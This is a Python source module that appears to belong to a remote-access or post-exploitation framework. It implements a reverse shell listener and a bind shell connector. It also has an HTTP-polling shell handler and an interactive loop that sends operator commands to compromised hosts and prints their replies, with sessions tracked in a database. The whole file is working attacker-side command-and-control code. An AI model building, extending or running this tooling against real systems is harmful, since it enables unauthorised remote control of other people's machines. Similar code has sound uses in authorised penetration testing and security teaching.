import socket 
import threading
import queue
from src.modules.http_listener import Listen, NEW_CONNECTION,COMMAND_QUEUE,RESULT_QUEUE,NOTIFY_QUEUE
from .database import init_db,register_session,close_session_in_db,get_active_sessions
ACTIVE_SOCKETS = {}
active_client = set()
session_to_client = {}
new_http_shell_msg = False

def start_reverse_handler(listen_ip: str, listen_port: int):
    #command: listen
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind((listen_ip,listen_port))
    server.listen(5)
    def listen_loop():
        while True:
            client_sock,addr = server.accept()
            sid = register_session("reverse",addr[0],addr[1])
            ACTIVE_SOCKETS[sid] = client_sock
            NOTIFY_QUEUE.put(f"\n[+] New HTTP reverse shell session from {addr[0]}")
    threading.Thread(target=listen_loop,daemon=True).start()

def connect_to_bind_shell(target_ip: str, target_port: int):
    #command: connect
    try:
        client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client_sock.connect((target_ip,target_port))
        sid = register_session("bind",target_ip,target_port)
        ACTIVE_SOCKETS[sid] =  client_sock
        print(f"Bind shell session opened {sid}")
    except Exception as e:
        print(f"failed to connect to bind shell: {e}")

def start_http_handler(listen_ip: str,listen_port: int):
        #command: listen
        server_sock = Listen(listen_ip,listen_port)
        print(server_sock)
        def listen_loop():
            while True:
                try:
                    client_ip,client_port = NEW_CONNECTION.get()
                    client_key = (client_ip,client_port)
                    if client_key not in active_client:
                        sid = register_session("http",client_ip,client_port)
                        ACTIVE_SOCKETS[sid] = server_sock
                        active_client.add(client_ip)
                        session_to_client[sid] = client_ip
                except queue.Empty:
                    continue
                except Exception:
                    pass
        threading.Thread(target=listen_loop,daemon=True).start()

def interact_with_session(session_id: int,modules,current_module):
    #command: interact
    sock = ACTIVE_SOCKETS.get(session_id)
    if not sock:
        print("[-] Session not found or already closed.")
        return
    print(f"[*] Interactive mode with session [{session_id}]. To exit, enter 'background'")
    if modules[current_module]["type_conn"] == "tcp":
        while True:
            try:
                cmd = input(f"session [{session_id}] > ")
                if cmd.strip() == "background":
                    print(f"[*] The session has been sent to the background.")
                    break
                if not cmd.strip():
                    continue    
                if modules[current_module]["type_conn"] == "tcp":
                    sock.send((cmd + "\n").encode("utf-8"))   
                    responce = sock.recv(4096).decode(errors="ignore")
                    print(responce,end="")
            except (ConnectionResetError, BrokenPipeError):
                print(f"[-] Session [{session_id}] terminated abnormally.")
                close_session_in_db(session_id)
                ACTIVE_SOCKETS.pop(session_id,None)
                break
    elif modules[current_module]["type_conn"] == "http":
        client_info = session_to_client.get(session_id)
        if isinstance(client_info,tuple):
            client_ip = client_info[0]
        else:
            client_ip = client_info
        from src.modules.http_listener import COMMAND_QUEUE,RESULT_QUEUE
        while not RESULT_QUEUE[client_ip].empty():
            try:
                RESULT_QUEUE[client_ip].get_nowait()
            except queue.Empty:
                break
        while True:
                try:
                    cmd = input(f"session [{session_id}] > ")
                    if cmd.strip() == "background":
                        print(f"[*] The session has been sent to the background.")
                        break
                    if not cmd.strip():
                        continue    
                    COMMAND_QUEUE[client_ip].put(cmd)
                    try:
                        result = RESULT_QUEUE[client_ip].get()
                        print(result,end="")
                    except queue.Empty:
                        print("[-] Timeout: No response from host.")
                except (ConnectionResetError, BrokenPipeError):
                    print(f"[-] Session [{session_id}] terminated abnormally.")
                    close_session_in_db(session_id)
                    ACTIVE_SOCKETS.pop(session_id,None)
                    break